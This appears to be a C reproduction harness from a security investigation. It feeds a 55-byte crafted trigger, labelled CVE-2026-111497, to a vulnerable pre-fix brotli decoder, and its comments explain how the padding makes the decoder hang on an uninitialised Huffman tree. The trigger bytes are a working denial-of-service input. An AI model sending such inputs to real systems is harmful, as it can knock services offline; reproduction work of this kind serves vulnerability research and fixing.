// This project's own harness code (NOT part of brotli itself): calls the real, unmodified, TRUE pre-fix
// vulnerable brotli decoder API the same way any real caller would. See README.md in this directory for
// full context. This directory corrects the premise of the sibling directory
// test/c/cve_repro/brotli_cve_2026_111497/, which (per docs/DESIGN.md Sec.22.311) was accidentally built
// from the already-FIXED commit -- this one is the true pre-fix vulnerable commit
// 34f020fa9daba975747b29885314c2545b7aa040.
#include <stddef.h>
#include <string.h>
#include "brotli/decode.h"

// The 15-byte CVE-2026-111497 trigger reused unchanged from the (already-fixed-version) sibling directory
// (docs/DESIGN.md Sec.22.301), PLUS 40 bytes of trailing zero padding -- the padding is required so the
// bit-reader's BROTLI_FAST_INPUT_SLACK (28-byte) margin check (c/dec/bit_reader.h) stays satisfied long
// enough for execution to actually reach the vulnerable DecodeLiteralBlockSwitch call; without enough
// padding, an unrelated BROTLI_DECODER_ERROR_FORMAT_BLOCK_LENGTH_1 (-9) fires first and masks the real bug.
// See README.md / docs/DESIGN.md Sec.22.314 for the full derivation (found via reading bit_reader.h's exact
// margin formula, not by guessing padding amounts).
static const unsigned char kBrotliCve202611497PrefixTrigger[55] = {
    0x11, 0x59, 0xfe, 0xff, 0xff, 0x03, 0x80, 0x00, 0x08, 0xfc, 0x02, 0xe0, 0xf7, 0xf4, 0x1f,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

// consume(): same shape used throughout this whole investigation. WARNING: on this TRUE vulnerable source,
// this call HANGS (confirmed via gdb: spins inside PreloadSymbol/ProcessCommandsInternal using a stale,
// never-initialized s->literal_htree, because PrepareLiteralDecoding was skipped -- see README.md) rather
// than returning. Do not call this directly without an external timeout/watchdog.
int consume(const unsigned char *in, int in_len) {
  if (in_len < 0) return -1;
  BrotliDecoderState *s = BrotliDecoderCreateInstance(NULL, NULL, NULL);
  if (!s) return -2;
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_LARGE_WINDOW, 1);
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_DISABLE_RING_BUFFER_REALLOCATION, 1);

  static unsigned char out[1 << 25];
  const unsigned char *next_in = in;
  size_t avail_in = (size_t)in_len;
  unsigned char *next_out = out;
  size_t avail_out = sizeof(out);
  size_t total_out = 0;

  BrotliDecoderResult r =
      BrotliDecoderDecompressStream(s, &avail_in, &next_in, &avail_out, &next_out, &total_out);

  int rc = (int)r;
  BrotliDecoderDestroyInstance(s);
  return rc;
}

#ifdef BROTLI_CVE_NATIVE_MAIN
// Native fidelity-check driver. See README.md for how to run it (with an external `timeout`, since this is
// expected to HANG on the true vulnerable source -- that hang, confirmed via gdb, IS the finding).
#include <stdio.h>
int main(void) {
  BrotliDecoderState *s = BrotliDecoderCreateInstance(NULL, NULL, NULL);
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_LARGE_WINDOW, 1);
  BrotliDecoderSetParameter(s, BROTLI_DECODER_PARAM_DISABLE_RING_BUFFER_REALLOCATION, 1);
  static unsigned char out[1 << 25];
  const unsigned char *next_in = kBrotliCve202611497PrefixTrigger;
  size_t avail_in = sizeof(kBrotliCve202611497PrefixTrigger);
  unsigned char *next_out = out;
  size_t avail_out = sizeof(out);
  size_t total_out = 0;
  fprintf(stderr, "starting (expected to hang on the true vulnerable source)...\n");
  BrotliDecoderResult r =
      BrotliDecoderDecompressStream(s, &avail_in, &next_in, &avail_out, &next_out, &total_out);
  printf("result=%d error_code=%d total_out=%zu\n", (int)r, (int)BrotliDecoderGetErrorCode(s), total_out);
  BrotliDecoderDestroyInstance(s);
  return 0;
}
#endif
